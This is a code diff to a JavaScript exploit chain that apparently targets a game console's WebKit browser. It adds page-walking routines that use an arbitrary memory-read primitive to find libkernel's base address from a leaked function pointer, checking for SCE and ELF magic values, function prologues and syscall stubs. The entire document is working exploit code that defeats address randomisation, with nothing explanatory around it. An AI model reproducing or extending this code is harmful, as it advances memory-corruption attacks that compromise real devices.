@@ -212,6 +212,52 @@ const K_ERROR_CANDS = [
     0xd9d0, 0x3370, 0x183c0, 0x299c0,
 ];
 
+/** ≤8 reads — spot-check syscall stubs without full module scan. */
+function liteSyscallStubScore(p, base) {
+    let stubs = 0;
+    for (let o = 0x1000; o < 0x50000; o += 0x8000) {
+        const w = read4p(p, base.add32(o));
+        if (w != null && (w & 0xffffff) === 0xc0c748) stubs++;
+    }
+    return stubs;
+}
+
+function weakLibkernelBaseHit(p, page, magic, ctx) {
+    if (!page || magic == null) return false;
+    if (checkPrologueAt(p, page)) return true;
+    if (magic === SCE_MAGIC) {
+        if (checkPrologueAt(p, page.add32(SCE_ELF_OFF))) return true;
+        if (liteSyscallStubScore(p, page) >= 2) return true;
+    }
+    if (magic === ELF_MAGIC && liteSyscallStubScore(p, page) >= 2) return true;
+    return isLibkernelPrologue(p, page, ctx);
+}
+
+/** Walk aligned pages below fn ptr — no fnPtr read, break on unmapped. */
+function resolveExtPtrPageWalk(p, fnPtr, webkitBase, off, maxPages) {
+    maxPages = maxPages != null ? maxPages : 48;
+    const ctx = { fnPtr, webkitBase, off };
+    let page = pageAlignDown(fnPtr, 0x4000);
+    for (let i = 0; i < maxPages; i++) {
+        if (!page || !plausibleLkBeforeRead(page, fnPtr, webkitBase, off)) break;
+        const magic = read4p(p, page);
+        if (magic == null) break;
+        if (weakLibkernelBaseHit(p, page, magic, ctx)) {
+            const kOff = Number(ptrBig(fnPtr) - ptrBig(page));
+            const tag = magic === SCE_MAGIC ? "walk-sce" : (magic === ELF_MAGIC ? "walk-elf" : "walk-pro");
+            return {
+                lk: page,
+                iatRva: null,
+                fnPtr,
+                via: tag + "+k=" + kOff.toString(16),
+                k__error: kOff,
+            };
+        }
+        page = page.sub32(0x4000);
+    }
+    return null;
+}
+
 function kErrorCandidates(off) {
     const out = [];
     if (off.k__error != null) out.push(off.k__error);
@@ -1974,21 +2020,25 @@ function discoverTextareaVtables(p, opts) {
     return { cells: cells.length, vtables: vtables, cellDbg: cellDbg };
 }
 
-/** Resolve ext import ptr → libkernel base — no fnPtr read, all k__error cands, guarded. */
-export function resolveExtPtrSafe(p, fnPtr, off, webkitBase) {
+/** Resolve ext import ptr → libkernel base — no fnPtr read, k__error then page walk. */
+export function resolveExtPtrSafe(p, fnPtr, off, webkitBase, opts) {
+    opts = opts || {};
     if (!fnPtr || fnPtr.hi < 0x8) return null;
+    const ctx = { fnPtr, webkitBase, off };
     const errs = kErrorCandidates(off);
     for (let i = 0; i < errs.length; i++) {
         const lk = fnPtr.sub32(errs[i]);
         if (!plausibleLkBeforeRead(lk, fnPtr, webkitBase, off)) continue;
-        if (!isLibkernelPrologue(p, lk, { fnPtr, webkitBase, off })) continue;
-        return { lk, iatRva: null, fnPtr, via: "error+" + errs[i].toString(16) };
+        if (!isLibkernelPrologue(p, lk, ctx)) continue;
+        return { lk, iatRva: null, fnPtr, via: "error+" + errs[i].toString(16), k__error: errs[i] };
     }
     const pageBase = pageAlignDown(fnPtr, 0x4000);
     if (plausibleLkBeforeRead(pageBase, fnPtr, webkitBase, off)
-        && isLibkernelPrologue(p, pageBase, { fnPtr, webkitBase, off }))
-        return { lk: pageBase, iatRva: null, fnPtr, via: "page" };
-    return null;
+        && weakLibkernelBaseHit(p, pageBase, read4p(p, pageBase), ctx)) {
+        const kOff = Number(ptrBig(fnPtr) - ptrBig(pageBase));
+        return { lk: pageBase, iatRva: null, fnPtr, via: "page+k=" + kOff.toString(16), k__error: kOff };
+    }
+    return resolveExtPtrPageWalk(p, fnPtr, webkitBase, off, opts.walkPages);
 }
 
 /** Resolve ext code ptr → libkernel base — never reads fnPtr (code page OOM on poops). */
@@ -2023,27 +2073,34 @@ function resolveExtPtrToLibkernel(p, fnPtr, off, webkitBase, iatRva, opts) {
     }
 
     const pageBase = pageAlignDown(fnPtr, 0x4000);
-    if (plausibleLkBeforeRead(pageBase, fnPtr, webkitBase, off)
-        && isLibkernelPrologue(p, pageBase, { fnPtr, webkitBase, off })) {
-        return {
-            lk: pageBase,
-            iatRva,
-            fnPtr,
-            strong: false,
-            via: "page",
-        };
+    if (plausibleLkBeforeRead(pageBase, fnPtr, webkitBase, off)) {
+        const mag = read4p(p, pageBase);
+        if (weakLibkernelBaseHit(p, pageBase, mag, { fnPtr, webkitBase, off })) {
+            const kOff = Number(ptrBig(fnPtr) - ptrBig(pageBase));
+            return {
+                lk: pageBase,
+                iatRva,
+                fnPtr,
+                strong: false,
+                via: "page+k=" + kOff.toString(16),
+            };
+        }
     }
 
-    const maxWalk = opts.maxWalkPages != null ? opts.maxWalkPages
-        : (opts.lite ? 0 : 24);
+    const walked = resolveExtPtrPageWalk(p, fnPtr, webkitBase, off, opts.walkPages != null ? opts.walkPages : 48);
+    if (walked) {
+        return Object.assign({ iatRva, strong: false }, walked);
+    }
+
+    const maxWalk = opts.maxWalkPages != null ? opts.maxWalkPages : 0;
     if (maxWalk <= 0) return null;
 
-    const walked = findModuleBaseBeforeCode(p, fnPtr, webkitBase, off, maxWalk);
-    if (walked && plausibleLkBeforeRead(walked, fnPtr, webkitBase, off)
-        && isLibkernelPrologue(p, walked, { fnPtr, webkitBase, off })) {
-        const v = opts.lite ? { ok: true, strong: false } : verifyLibkernelBase(p, walked, off);
+    const walked2 = findModuleBaseBeforeCode(p, fnPtr, webkitBase, off, maxWalk);
+    if (walked2 && plausibleLkBeforeRead(walked2, fnPtr, webkitBase, off)
+        && isLibkernelPrologue(p, walked2, { fnPtr, webkitBase, off })) {
+        const v = opts.lite ? { ok: true, strong: false } : verifyLibkernelBase(p, walked2, off);
         return {
-            lk: walked,
+            lk: walked2,
             iatRva,
             fnPtr,
             strong: !!(v.ok && v.strong),
